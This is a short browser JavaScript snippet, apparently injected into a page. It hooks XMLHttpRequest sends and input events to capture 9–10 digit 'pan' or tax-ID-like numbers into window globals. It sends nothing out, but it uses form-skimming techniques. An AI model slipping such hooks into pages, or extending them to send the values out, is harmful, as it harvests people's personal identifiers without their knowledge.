(() => {
  if (window.__irdPanHook) return;
  window.__irdPanHook = true;
  const rx = /(?:^|&)pan=(\d{9,10})(?:&|$)/i;
  const send = XMLHttpRequest.prototype.send;
  XMLHttpRequest.prototype.send = function (body) {
    try {
      if (typeof body === "string") {
        const m = rx.exec(body);
        if (m) window.__irdPan = m[1];
      }
    } catch {}
    return send.apply(this, arguments);
  };
  document.addEventListener("input", (e) => {
    const t = e.target;
    if (t && t.tagName === "INPUT" && t.type !== "password" && /^\d{9,10}$/.test(t.value || "")) window.__irdTyped = t.value;
  }, true);
})();
